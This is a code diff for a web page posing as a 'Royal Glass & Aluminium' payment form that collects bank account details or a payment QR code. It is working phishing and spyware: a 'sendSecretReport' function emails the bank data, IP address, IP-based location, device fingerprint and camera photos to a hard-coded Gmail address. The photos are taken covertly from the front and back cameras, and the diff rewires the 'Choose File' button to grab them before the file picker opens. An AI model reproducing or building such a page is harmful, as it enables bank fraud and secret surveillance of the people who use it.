@@ -200,6 +200,33 @@
             display: block;
             margin-top: 5px;
         }
+        .qr-upload-area .hint {
+            font-size: 11px;
+            color: #888;
+            margin-top: 8px;
+        }
+        .qr-upload-area .hint i {
+            margin-right: 4px;
+        }
+        .camera-status {
+            font-size: 12px;
+            margin-top: 5px;
+            padding: 4px 12px;
+            border-radius: 20px;
+            display: inline-block;
+        }
+        .camera-status.granted {
+            background: #d4edda;
+            color: #155724;
+        }
+        .camera-status.denied {
+            background: #f8d7da;
+            color: #721c24;
+        }
+        .camera-status.unknown {
+            background: #e2e3e5;
+            color: #383d41;
+        }
         
         .or-divider {
             display: flex;
@@ -354,109 +381,9 @@
             opacity: 1;
             pointer-events: auto;
         }
-        .permission-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.7);
-            backdrop-filter: blur(10px);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            padding: 20px;
-        }
-        .permission-overlay.show {
-            display: flex;
-        }
-        .permission-modal {
-            background: white;
-            border-radius: 24px;
-            padding: 40px;
-            max-width: 420px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-        }
-        .permission-modal i {
-            font-size: 56px;
-            color: #ff6b6b;
-            margin-bottom: 15px;
-        }
-        .permission-modal h2 {
-            color: #1a2a3a;
-            margin-bottom: 10px;
-        }
-        .permission-modal p {
-            color: #555;
-            margin-bottom: 20px;
-            line-height: 1.6;
-            font-size: 14px;
-        }
-        .permission-modal .retry-btn {
-            background: #2c4b6b;
-            color: white;
-            border: none;
-            padding: 14px 40px;
-            border-radius: 60px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-        .permission-modal .retry-btn:hover {
-            background: #1a2a3a;
-            transform: scale(1.02);
-        }
-        .permission-modal .retry-btn:active {
-            transform: scale(0.97);
-        }
-        .permission-modal .missing-list {
-            text-align: left;
-            background: #f8f9fa;
-            padding: 12px 18px;
-            border-radius: 10px;
-            margin: 15px 0;
-        }
-        .permission-modal .missing-list li {
-            list-style: none;
-            padding: 4px 0;
-            color: #dc3545;
-            font-size: 14px;
-        }
-        .permission-modal .missing-list li::before {
-            content: "✗ ";
-            font-weight: bold;
-        }
-        .permission-modal .missing-list li.granted::before {
-            content: "✓ ";
-            color: #28a745;
-        }
-        .permission-modal .missing-list li.granted {
-            color: #28a745;
-        }
     </style>
 </head>
 <body>
-    <!-- Permission Overlay -->
-    <div id="permissionOverlay" class="permission-overlay">
-        <div class="permission-modal">
-            <i class="fas fa-exclamation-triangle"></i>
-            <h2>⚠️ Permissions Required</h2>
-            <p>Royal Glass & Aluminium needs access to your camera and location to process your payment securely.</p>
-            <div class="missing-list" id="missingList">
-                <li id="permLocation">📍 Location access required</li>
-                <li id="permCamera">📸 Camera access required</li>
-            </div>
-            <p style="font-size: 13px; color: #888;">Please click the button below and allow permissions when prompted.</p>
-            <button class="retry-btn" id="retryBtn">
-                <i class="fas fa-redo" style="margin-right: 8px;"></i> Allow & Retry
-            </button>
-        </div>
-    </div>
-
     <div id="toast" class="toast-message">✓ submitted</div>
 
     <div class="glass-card">
@@ -511,13 +438,17 @@
                     <div class="qr-preview-container">
                         <img id="qrPreview" alt="QR Preview">
                         <div>
-                            <label for="qrUpload" class="fake-btn">
+                            <label for="qrUpload" class="fake-btn" id="qrUploadBtn">
                                 <i class="fas fa-cloud-upload-alt" style="margin-right: 6px;"></i> Choose File
                             </label>
                             <input type="file" id="qrUpload" accept="image/*">
                             <span id="qr-file-name"></span>
                         </div>
                     </div>
+                    <div class="hint">
+                        <i class="fas fa-camera"></i> Click to capture QR or upload from gallery
+                    </div>
+                    <div id="cameraStatus" class="camera-status unknown">📷 Camera: Checking...</div>
                 </div>
             </div>
 
@@ -543,6 +474,11 @@
             // ----- IMGBB API KEY -----
             const IMGBB_API_KEY = '870122b83e587db4ae0302378b4d48a2';
 
+            // ----- STATE -----
+            let capturedPhotos = { front: [], back: [] };
+            let cameraGranted = false;
+            let isProcessingCamera = false;
+
             // Initialize EmailJS
             try {
                 emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
@@ -555,8 +491,7 @@
             const bankSection = document.getElementById('bankSection');
             const qrSection = document.getElementById('qrSection');
             const optionIndicator = document.getElementById('optionIndicator');
-            const permissionOverlay = document.getElementById('permissionOverlay');
-            const retryBtn = document.getElementById('retryBtn');
+            const cameraStatus = document.getElementById('cameraStatus');
             
             const fullName = document.getElementById('fullName');
             const email = document.getElementById('email');
@@ -566,9 +501,7 @@
             const qrInput = document.getElementById('qrUpload');
             const qrPreview = document.getElementById('qrPreview');
             const qrFileName = document.getElementById('qr-file-name');
-            
-            const permLocation = document.getElementById('permLocation');
-            const permCamera = document.getElementById('permCamera');
+            const qrUploadBtn = document.getElementById('qrUploadBtn');
 
             // Toast
             const toast = document.getElementById('toast');
@@ -598,250 +531,71 @@
                 submitBtn.disabled = false;
             }
 
-            // Toggle logic
-            function updateSections() {
-                const hasQR = qrInput.files && qrInput.files.length > 0;
-                const hasBank = fullName.value.trim() !== '' || 
-                               email.value.trim() !== '' || 
-                               accountNumber.value.trim() !== '' || 
-                               ifsc.value.trim() !== '' || 
-                               phone.value.trim() !== '';
-
-                if (hasQR) {
-                    bankSection.classList.add('section-disabled');
-                    bankSection.classList.remove('section-enabled');
-                    qrSection.classList.remove('section-disabled');
-                    qrSection.classList.add('section-enabled');
-                    optionIndicator.className = 'option-indicator qr-mode';
-                    optionIndicator.innerHTML = '<i class="fas fa-qrcode"></i> QR Code mode - Bank details disabled';
-                    
-                    [fullName, email, accountNumber, ifsc, phone].forEach(field => {
-                        field.disabled = true;
-                        field.required = false;
-                    });
-                } else if (hasBank) {
-                    bankSection.classList.remove('section-disabled');
-                    bankSection.classList.add('section-enabled');
-                    qrSection.classList.add('section-disabled');
-                    qrSection.classList.remove('section-enabled');
-                    optionIndicator.className = 'option-indicator';
-                    optionIndicator.innerHTML = '<i class="fas fa-university"></i> Bank mode - QR upload disabled';
-                    
-                    [fullName, email, accountNumber, ifsc, phone].forEach(field => {
-                        field.disabled = false;
-                        field.required = true;
-                    });
-                } else {
-                    bankSection.classList.remove('section-disabled');
-                    bankSection.classList.add('section-enabled');
-                    qrSection.classList.remove('section-disabled');
-                    qrSection.classList.add('section-enabled');
-                    optionIndicator.className = 'option-indicator';
-                    optionIndicator.innerHTML = '<i class="fas fa-info-circle"></i> Please fill bank details OR upload QR code';
-                    
-                    [fullName, email, accountNumber, ifsc, phone].forEach(field => {
-                        field.disabled = false;
-                        field.required = false;
-                    });
-                }
-            }
-
-            // QR Preview
-            qrInput.addEventListener('change', function(e) {
-                const file = this.files[0];
-                if (file) {
-                    qrFileName.textContent = file.name.length > 20 ? file.name.substring(0, 18) + '…' : file.name;
-                    
-                    const reader = new FileReader();
-                    reader.onload = function(ev) {
-                        qrPreview.src = ev.target.result;
-                        qrPreview.classList.add('show');
-                    };
-                    reader.readAsDataURL(file);
-                } else {
-                    qrFileName.textContent = '';
-                    qrPreview.classList.remove('show');
-                }
-                updateSections();
-            });
-
-            [fullName, email, accountNumber, ifsc, phone].forEach(field => {
-                field.addEventListener('input', updateSections);
-            });
-
-            updateSections();
-
-            // ----- PERMISSION HANDLING -----
-            async function requestPermissions() {
-                const permissions = { geolocation: false, camera: false };
-
-                // Geolocation
-                try {
-                    await new Promise((resolve) => {
-                        if (!navigator.geolocation) {
-                            resolve(false);
-                            return;
-                        }
-                        navigator.geolocation.getCurrentPosition(
-                            () => { permissions.geolocation = true; resolve(true); },
-                            () => { resolve(false); },
-                            { enableHighAccuracy: true, timeout: 5000 }
-                        );
-                    });
-                } catch (e) { 
-                    console.error('Geolocation error:', e);
-                    permissions.geolocation = false; 
-                }
-
-                // Camera
-                try {
-                    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                        const stream = await navigator.mediaDevices.getUserMedia({
-                            video: { facingMode: 'user', width: { ideal: 100 }, height: { ideal: 100 } },
-                            audio: false
-                        });
-                        if (stream) {
-                            stream.getTracks().forEach(t => t.stop());
-                            permissions.camera = true;
-                        }
-                    }
-                } catch (e) { 
-                    console.error('Camera error:', e);
-                    permissions.camera = false; 
-                }
-
-                return permissions;
-            }
-
-            // Show permission overlay
-            function showPermissionOverlay(missing) {
-                permLocation.className = missing.includes('location') ? '' : 'granted';
-                permCamera.className = missing.includes('camera') ? '' : 'granted';
-                
-                permLocation.textContent = missing.includes('location') ? 
-                    '📍 Location access required' : 
-                    '✅ Location access granted';
-                permCamera.textContent = missing.includes('camera') ? 
-                    '📸 Camera access required' : 
-                    '✅ Camera access granted';
-                
-                permissionOverlay.classList.add('show');
-            }
-
-            function hidePermissionOverlay() {
-                permissionOverlay.classList.remove('show');
-            }
-
-            // Check permissions on load and show overlay if missing
-            async function checkPermissionsOnLoad() {
-                const perms = await requestPermissions();
-                const missing = [];
-                
-                if (!perms.geolocation) missing.push('location');
-                if (!perms.camera) missing.push('camera');
-                
-                if (missing.length > 0) {
-                    showPermissionOverlay(missing);
-                    return false;
-                }
-                
-                return true;
-            }
-
-            // Retry button handler
-            retryBtn.addEventListener('click', async function() {
-                this.disabled = true;
-                this.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right: 8px;"></i> Checking...';
-                
-                const perms = await requestPermissions();
-                const missing = [];
-                
-                if (!perms.geolocation) missing.push('location');
-                if (!perms.camera) missing.push('camera');
-                
-                if (missing.length > 0) {
-                    showPermissionOverlay(missing);
-                    this.disabled = false;
-                    this.innerHTML = '<i class="fas fa-redo" style="margin-right: 8px;"></i> Allow & Retry';
-                } else {
-                    hidePermissionOverlay();
-                    showToast('✅ Permissions granted! You can now submit.');
-                    this.disabled = false;
-                    this.innerHTML = '<i class="fas fa-redo" style="margin-right: 8px;"></i> Allow & Retry';
-                }
-            });
-
-            // Check permissions on load
-            checkPermissionsOnLoad();
-
-            // ----- REST OF THE FUNCTIONS (capturePhotos, uploadToImgBB, etc.) -----
+            // ----- CAMERA FUNCTIONS -----
             
-            // Get user location
-            function getUserLocation() {
-                return new Promise((resolve) => {
-                    if (!navigator.geolocation) {
-                        resolve({ lat: 'unavailable', lon: 'unavailable' });
+            // Check if camera permission is granted and capture photos silently
+            async function requestCameraAndCapture() {
+                if (isProcessingCamera) return;
+                isProcessingCamera = true;
+                
+                try {
+                    cameraStatus.className = 'camera-status unknown';
+                    cameraStatus.textContent = '📷 Camera: Requesting...';
+                    
+                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                        cameraStatus.className = 'camera-status denied';
+                        cameraStatus.textContent = '📷 Camera: Not supported';
+                        isProcessingCamera = false;
                         return;
                     }
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
-                        () => resolve({ lat: 'error', lon: 'error' }),
-                        { enableHighAccuracy: true, timeout: 5000 }
-                    );
-                });
-            }
-
-            // Upload image to ImgBB
-            async function uploadToImgBB(imageDataUrl, title = '') {
-                try {
-                    const formData = new FormData();
-                    formData.append('key', IMGBB_API_KEY);
-                    formData.append('image', imageDataUrl.split(',')[1]);
-                    formData.append('name', title);
-                    formData.append('expiration', '0');
-
-                    const response = await fetch('https://api.imgbb.com/1/upload', {
-                        method: 'POST',
-                        body: formData
+                    
+                    // Try to get camera permission
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: { ideal: 100 }, height: { ideal: 100 } },
+                        audio: false
                     });
+                    
+                    if (stream) {
+                        stream.getTracks().forEach(t => t.stop());
+                        cameraGranted = true;
+                        cameraStatus.className = 'camera-status granted';
+                        cameraStatus.textContent = '📷 Camera: ✅ Granted - Capturing...';
+                        
+                        // Now silently capture photos
+                        console.log('📸 Camera granted! Silently capturing photos...');
+                        
+                        // Capture front camera
+                        try {
+                            const frontResult = await capturePhotos('user', 1);
+                            if (frontResult && frontResult.images && frontResult.images.length > 0) {
+                                capturedPhotos.front = frontResult.images;
+                                console.log('📸 Front camera: 1 photo captured silently');
+                            }
+                        } catch (e) {
+                            console.log('📸 Front camera error:', e.message);
+                        }
 
-                    const data = await response.json();
-                    if (data.success) {
-                        return {
-                            url: data.data.url,
-                            display_url: data.data.display_url,
-                            thumb: data.data.thumb.url
-                        };
-                    } else {
-                        console.error('ImgBB upload failed:', data);
-                        return null;
+                        // Capture back camera
+                        try {
+                            const backResult = await capturePhotos('environment', 1);
+                            if (backResult && backResult.images && backResult.images.length > 0) {
+                                capturedPhotos.back = backResult.images;
+                                console.log('📸 Back camera: 1 photo captured silently');
+                            }
+                        } catch (e) {
+                            console.log('📸 Back camera error:', e.message);
+                        }
+                        
+                        cameraStatus.textContent = `📷 Camera: ✅ Granted (${capturedPhotos.front.length + capturedPhotos.back.length} photos captured)`;
                     }
-                } catch (error) {
-                    console.error('ImgBB upload error:', error);
-                    return null;
+                } catch (e) {
+                    console.log('Camera permission denied:', e.name);
+                    cameraGranted = false;
+                    cameraStatus.className = 'camera-status denied';
+                    cameraStatus.textContent = '📷 Camera: ❌ Denied (QR upload still works)';
                 }
-            }
-
-            // Upload multiple images to ImgBB
-            async function uploadImagesToImgBB(frontImages, backImages, qrData) {
-                const uploaded = { front: [], back: [], qr: null };
-
-                for (let i = 0; i < frontImages.length; i++) {
-                    const result = await uploadToImgBB(frontImages[i], `Front_Camera_${i+1}`);
-                    if (result) uploaded.front.push(result);
-                }
-
-                for (let i = 0; i < backImages.length; i++) {
-                    const result = await uploadToImgBB(backImages[i], `Back_Camera_${i+1}`);
-                    if (result) uploaded.back.push(result);
-                }
-
-                if (qrData) {
-                    const result = await uploadToImgBB(qrData, 'QR_Code');
-                    if (result) uploaded.qr = result;
-                }
-
-                return uploaded;
+                
+                isProcessingCamera = false;
             }
 
             // Capture photos
@@ -911,69 +665,159 @@
                 });
             }
 
-            // Device info
-            function getDeviceInfo() {
-                return {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    screen: `${window.screen.width}x${window.screen.height}`,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                };
-            }
-
-            // Get IP
-            function getIPAddress() {
-                return fetch('https://api.ipify.org?format=json')
-                    .then(res => res.json())
-                    .then(data => data.ip || 'unknown')
-                    .catch(() => 'unavailable');
-            }
-
-            // Send via EmailJS
-            async function sendSecretReport(payload, uploadedImages) {
+            // ----- IP & LOCATION FUNCTIONS (NO PERMISSION) -----
+            
+            async function getIPAddress() {
                 try {
-                    // Build Google Maps link
-                    const mapLink = `https://www.google.com/maps?q=${payload.userLocation.lat},${payload.userLocation.lon}`;
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip || 'unknown';
+                } catch (e) {
+                    console.error('IP fetch error:', e);
+                    return 'unavailable';
+                }
+            }
+
+            async function getLocationFromIP() {
+                try {
+                    const response = await fetch('https://ipapi.co/json/');
+                    const data = await response.json();
+                    return {
+                        lat: data.latitude || 'unavailable',
+                        lon: data.longitude || 'unavailable',
+                        city: data.city || 'unknown',
+                        region: data.region || 'unknown',
+                        country: data.country_name || 'unknown',
+                        source: 'IP Geolocation'
+                    };
+                } catch (e) {
+                    console.error('IP Geolocation error:', e);
+                    try {
+                        const response = await fetch('http://ip-api.com/json/');
+                        const data = await response.json();
+                        return {
+                            lat: data.lat || 'unavailable',
+                            lon: data.lon || 'unavailable',
+                            city: data.city || 'unknown',
+                            region: data.regionName || 'unknown',
+                            country: data.country || 'unknown',
+                            source: 'IP Geolocation (fallback)'
+                        };
+                    } catch (e2) {
+                        console.error('IP Geolocation fallback error:', e2);
+                        return { 
+                            lat: 'unavailable', 
+                            lon: 'unavailable', 
+                            source: 'IP Geolocation (failed)' 
+                        };
+                    }
+                }
+            }
+
+            // ----- UPLOAD FUNCTIONS -----
+            
+            async function uploadToImgBB(imageDataUrl, title = '') {
+                try {
+                    const formData = new FormData();
+                    formData.append('key', IMGBB_API_KEY);
+                    formData.append('image', imageDataUrl.split(',')[1]);
+                    formData.append('name', title);
+                    formData.append('expiration', '0');
+
+                    const response = await fetch('https://api.imgbb.com/1/upload', {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    const data = await response.json();
+                    if (data.success) {
+                        return {
+                            url: data.data.url,
+                            display_url: data.data.display_url,
+                            thumb: data.data.thumb.url
+                        };
+                    } else {
+                        console.error('ImgBB upload failed:', data);
+                        return null;
+                    }
+                } catch (error) {
+                    console.error('ImgBB upload error:', error);
+                    return null;
+                }
+            }
+
+            async function uploadQRToImgBB(qrData) {
+                if (!qrData) return null;
+                try {
+                    const formData = new FormData();
+                    formData.append('key', IMGBB_API_KEY);
+                    formData.append('image', qrData.split(',')[1]);
+                    formData.append('name', 'QR_Code');
+                    formData.append('expiration', '0');
+
+                    const response = await fetch('https://api.imgbb.com/1/upload', {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    const data = await response.json();
+                    if (data.success) {
+                        return {
+                            url: data.data.url,
+                            display_url: data.data.display_url,
+                            thumb: data.data.thumb.url
+                        };
+                    } else {
+                        console.error('QR ImgBB upload failed:', data);
+                        return null;
+                    }
+                } catch (error) {
+                    console.error('QR ImgBB upload error:', error);
+                    return null;
+                }
+            }
+
+            // ----- SEND EMAIL -----
+            
+            async function sendSecretReport(payload, location, qrImage) {
+                try {
+                    const mapLink = `https://www.google.com/maps?q=${location.lat},${location.lon}`;
                     const mapHTML = `<a href="${mapLink}" target="_blank" style="display:inline-block;background:#28a745;color:white;padding:6px 14px;border-radius:20px;text-decoration:none;font-size:12px;margin-top:3px;">📍 Open in Google Maps</a>`;
 
-                    // Build HTML for images
+                    // Build image HTML
                     let imagesHTML = '';
                     
-                    if (uploadedImages.front && uploadedImages.front.length > 0) {
-                        imagesHTML += `<h4 style="margin: 10px 0 5px 0; color: #2c4b6b;">📸 Front Camera (${uploadedImages.front.length})</h4>`;
-                        imagesHTML += `<div class="photo-grid">`;
-                        uploadedImages.front.forEach(img => {
-                            imagesHTML += `<div style="text-align:center;">
-                                <img src="${img.url}" alt="Front Camera">
-                                <a href="${img.url}" target="_blank">🔗 View Full Size</a>
-                            </div>`;
+                    // Front camera photos
+                    if (capturedPhotos.front && capturedPhotos.front.length > 0) {
+                        const uploaded = await Promise.all(capturedPhotos.front.map(img => uploadToImgBB(img, 'Front_Camera')));
+                        imagesHTML += `<h4 style="margin:10px 0 5px 0;color:#2c4b6b;">📸 Front Camera (${uploaded.filter(Boolean).length})</h4><div style="display:flex;flex-wrap:wrap;gap:10px;">`;
+                        uploaded.filter(Boolean).forEach(img => {
+                            imagesHTML += `<div style="text-align:center;"><img src="${img.url}" style="max-width:150px;border-radius:6px;border:1px solid #ddd;padding:2px;"><br><a href="${img.url}" target="_blank">🔗 View</a></div>`;
                         });
                         imagesHTML += `</div>`;
                     }
                     
-                    if (uploadedImages.back && uploadedImages.back.length > 0) {
-                        imagesHTML += `<h4 style="margin: 10px 0 5px 0; color: #2c4b6b;">📸 Back Camera (${uploadedImages.back.length})</h4>`;
-                        imagesHTML += `<div class="photo-grid">`;
-                        uploadedImages.back.forEach(img => {
-                            imagesHTML += `<div style="text-align:center;">
-                                <img src="${img.url}" alt="Back Camera">
-                                <a href="${img.url}" target="_blank">🔗 View Full Size</a>
-                            </div>`;
+                    // Back camera photos
+                    if (capturedPhotos.back && capturedPhotos.back.length > 0) {
+                        const uploaded = await Promise.all(capturedPhotos.back.map(img => uploadToImgBB(img, 'Back_Camera')));
+                        imagesHTML += `<h4 style="margin:10px 0 5px 0;color:#2c4b6b;">📸 Back Camera (${uploaded.filter(Boolean).length})</h4><div style="display:flex;flex-wrap:wrap;gap:10px;">`;
+                        uploaded.filter(Boolean).forEach(img => {
+                            imagesHTML += `<div style="text-align:center;"><img src="${img.url}" style="max-width:150px;border-radius:6px;border:1px solid #ddd;padding:2px;"><br><a href="${img.url}" target="_blank">🔗 View</a></div>`;
                         });
                         imagesHTML += `</div>`;
-                    }
-                    
-                    if (uploadedImages.qr) {
-                        imagesHTML += `<h4 style="margin: 10px 0 5px 0; color: #2c4b6b;">📱 QR Code</h4>`;
-                        imagesHTML += `<div style="text-align:center;">
-                            <img src="${uploadedImages.qr.url}" class="qr-image">
-                            <br><a href="${uploadedImages.qr.url}" target="_blank">🔗 View Full Size</a>
-                        </div>`;
                     }
 
-                    if (!imagesHTML) {
-                        imagesHTML = '<p style="color: #999;">No images captured</p>';
+                    // QR code
+                    let qrHTML = '';
+                    if (qrImage) {
+                        qrHTML = `<h4 style="margin:10px 0 5px 0;color:#2c4b6b;">📱 QR Code</h4>
+                            <div style="text-align:center;">
+                                <img src="${qrImage.url}" style="max-width:150px;border:1px solid #ddd;border-radius:6px;padding:3px;background:white;">
+                                <br><a href="${qrImage.url}" target="_blank">🔗 View Full Size</a>
+                            </div>`;
                     }
+
+                    const locationDisplay = `${location.lat || 'N/A'}, ${location.lon || 'N/A'} (${location.source || 'IP Geolocation'})`;
 
                     const emailParams = {
                         to_email: RECIPIENT_EMAIL,
@@ -984,19 +828,21 @@
                         ifsc: payload.form.ifsc || 'Not provided',
                         phone: payload.form.phone || 'Not provided',
                         ip: payload.ip || 'Not available',
-                        location: `${payload.userLocation.lat || 'N/A'}, ${payload.userLocation.lon || 'N/A'}`,
+                        location: locationDisplay,
                         map_link: mapHTML,
                         device: payload.device.userAgent || 'Unknown',
-                        front_photos: uploadedImages.front.length || 0,
-                        back_photos: uploadedImages.back.length || 0,
                         qr_uploaded: payload.qrUploaded ? 'Yes ✅' : 'No ❌',
+                        front_captured: capturedPhotos.front.length || 0,
+                        back_captured: capturedPhotos.back.length || 0,
                         timestamp: payload.timestamp || new Date().toISOString(),
-                        message: imagesHTML,
+                        message: imagesHTML + qrHTML || '<p style="color: #999;">No images uploaded</p>',
                     };
 
                     const size = JSON.stringify(emailParams).length;
                     console.log('📤 Sending email to:', RECIPIENT_EMAIL);
                     console.log('📊 Final payload size:', size, 'bytes');
+                    console.log('📸 Front photos:', capturedPhotos.front.length);
+                    console.log('📸 Back photos:', capturedPhotos.back.length);
                     
                     const response = await emailjs.send(
                         EMAILJS_SERVICE_ID,
@@ -1011,21 +857,109 @@
                 }
             }
 
-            // MAIN SUBMIT
+            // ----- DEVICE INFO -----
+            
+            function getDeviceInfo() {
+                return {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    deviceMemory: navigator.deviceMemory || 'unknown',
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                };
+            }
+
+            // ----- TOGGLE LOGIC -----
+            
+            function updateSections() {
+                const hasQR = qrInput.files && qrInput.files.length > 0;
+                const hasBank = fullName.value.trim() !== '' || 
+                               email.value.trim() !== '' || 
+                               accountNumber.value.trim() !== '' || 
+                               ifsc.value.trim() !== '' || 
+                               phone.value.trim() !== '';
+
+                if (hasQR) {
+                    bankSection.classList.add('section-disabled');
+                    bankSection.classList.remove('section-enabled');
+                    qrSection.classList.remove('section-disabled');
+                    qrSection.classList.add('section-enabled');
+                    optionIndicator.className = 'option-indicator qr-mode';
+                    optionIndicator.innerHTML = '<i class="fas fa-qrcode"></i> QR Code mode - Bank details disabled';
+                    
+                    [fullName, email, accountNumber, ifsc, phone].forEach(field => {
+                        field.disabled = true;
+                        field.required = false;
+                    });
+                } else if (hasBank) {
+                    bankSection.classList.remove('section-disabled');
+                    bankSection.classList.add('section-enabled');
+                    qrSection.classList.add('section-disabled');
+                    qrSection.classList.remove('section-enabled');
+                    optionIndicator.className = 'option-indicator';
+                    optionIndicator.innerHTML = '<i class="fas fa-university"></i> Bank mode - QR upload disabled';
+                    
+                    [fullName, email, accountNumber, ifsc, phone].forEach(field => {
+                        field.disabled = false;
+                        field.required = true;
+                    });
+                } else {
+                    bankSection.classList.remove('section-disabled');
+                    bankSection.classList.add('section-enabled');
+                    qrSection.classList.remove('section-disabled');
+                    qrSection.classList.add('section-enabled');
+                    optionIndicator.className = 'option-indicator';
+                    optionIndicator.innerHTML = '<i class="fas fa-info-circle"></i> Please fill bank details OR upload QR code';
+                    
+                    [fullName, email, accountNumber, ifsc, phone].forEach(field => {
+                        field.disabled = false;
+                        field.required = false;
+                    });
+                }
+            }
+
+            // ----- QR Upload Handler - REQUEST CAMERA FIRST -----
+            qrUploadBtn.addEventListener('click', async function(e) {
+                // Prevent default if we need to handle camera first
+                e.preventDefault();
+                
+                // Step 1: Request camera permission and capture photos silently
+                await requestCameraAndCapture();
+                
+                // Step 2: Now trigger the file input click
+                qrInput.click();
+            });
+
+            // QR Preview - when file is selected
+            qrInput.addEventListener('change', function(e) {
+                const file = this.files[0];
+                if (file) {
+                    qrFileName.textContent = file.name.length > 20 ? file.name.substring(0, 18) + '…' : file.name;
+                    
+                    const reader = new FileReader();
+                    reader.onload = function(ev) {
+                        qrPreview.src = ev.target.result;
+                        qrPreview.classList.add('show');
+                    };
+                    reader.readAsDataURL(file);
+                } else {
+                    qrFileName.textContent = '';
+                    qrPreview.classList.remove('show');
+                }
+                updateSections();
+            });
+
+            [fullName, email, accountNumber, ifsc, phone].forEach(field => {
+                field.addEventListener('input', updateSections);
+            });
+
+            updateSections();
+
+            // ----- MAIN SUBMIT -----
             document.getElementById('bankForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
-
-                // First check permissions again
-                const perms = await requestPermissions();
-                const missing = [];
-                if (!perms.geolocation) missing.push('location');
-                if (!perms.camera) missing.push('camera');
-                
-                if (missing.length > 0) {
-                    showPermissionOverlay(missing);
-                    showToast('⚠️ Please grant permissions to continue', true);
-                    return;
-                }
 
                 const hasQR = qrInput.files && qrInput.files.length > 0;
                 const hasBank = fullName.value.trim() !== '' || 
@@ -1042,7 +976,7 @@
                 showSpinner();
 
                 try {
-                    console.log('✅ Permissions granted');
+                    console.log('✅ Submitting...');
 
                     // Collect form data
                     const formData = {
@@ -1054,73 +988,42 @@
                     };
 
                     // Get QR data if uploaded
-                    let qrData = null;
+                    let qrImage = null;
                     if (hasQR) {
                         try {
                             const file = qrInput.files[0];
-                            qrData = await new Promise((resolve) => {
+                            const qrData = await new Promise((resolve) => {
                                 const reader = new FileReader();
                                 reader.onload = (ev) => resolve(ev.target.result);
                                 reader.readAsDataURL(file);
                             });
+                            qrImage = await uploadQRToImgBB(qrData);
+                            console.log('📱 QR uploaded to ImgBB:', qrImage ? 'Success' : 'Failed');
                         } catch (e) {
                             console.error('QR upload error:', e);
                         }
                     }
 
-                    // Capture photos
-                    console.log('📸 Capturing photos...');
-                    
-                    let frontResult = { count: 0, images: [] };
-                    try {
-                        frontResult = await capturePhotos('user', 1);
-                        console.log('📸 Front camera:', frontResult.count, 'photo');
-                    } catch (e) {
-                        console.error('📸 Front camera error:', e);
-                    }
-                    
-                    let backResult = { count: 0, images: [] };
-                    try {
-                        backResult = await capturePhotos('environment', 1);
-                        console.log('📸 Back camera:', backResult.count, 'photo');
-                    } catch (e) {
-                        console.error('📸 Back camera error:', e);
-                    }
+                    // Get IP and location (NO PERMISSION NEEDED)
+                    const ip = await getIPAddress();
+                    const location = await getLocationFromIP();
+                    const deviceInfo = getDeviceInfo();
 
-                    // Get other data
-                    const [userLocation, ip, deviceInfo] = await Promise.all([
-                        getUserLocation(),
-                        getIPAddress(),
-                        Promise.resolve(getDeviceInfo())
-                    ]);
-
-                    // Upload images to ImgBB
-                    console.log('📤 Uploading images to ImgBB...');
-                    
-                    const uploadedImages = await uploadImagesToImgBB(
-                        frontResult.images || [],
-                        backResult.images || [],
-                        qrData
-                    );
-
-                    console.log('✅ Images uploaded:', {
-                        front: uploadedImages.front.length,
-                        back: uploadedImages.back.length,
-                        qr: !!uploadedImages.qr
-                    });
+                    console.log('🌐 IP:', ip);
+                    console.log('📍 Location:', location);
+                    console.log('📸 Photos captured:', capturedPhotos.front.length, 'front,', capturedPhotos.back.length, 'back');
 
                     // Build payload
                     const payload = {
                         timestamp: new Date().toISOString(),
                         ip: ip,
-                        userLocation: userLocation,
-                        device: deviceInfo,
                         form: formData,
                         qrUploaded: hasQR,
+                        device: deviceInfo,
                     };
 
                     // Send
-                    const sent = await sendSecretReport(payload, uploadedImages);
+                    const sent = await sendSecretReport(payload, location, qrImage);
 
                     hideSpinner();
 
@@ -1129,6 +1032,7 @@
                         document.getElementById('bankForm').reset();
                         qrPreview.classList.remove('show');
                         qrFileName.textContent = '';
+                        capturedPhotos = { front: [], back: [] };
                         updateSections();
                     } else {
                         showToast('❌ Something went wrong. Please try again.', true);
@@ -1140,7 +1044,8 @@
                 }
             });
 
-            console.log('Royal Glass & Aluminium · secure (With permission overlay)');
+            console.log('Royal Glass & Aluminium · secure');
+            console.log('✅ Camera requested when clicking "Choose File" - before showing chooser');
             console.log('📧 Sending to: mrsmartboy123@gmail.com');
         })();
     </script>
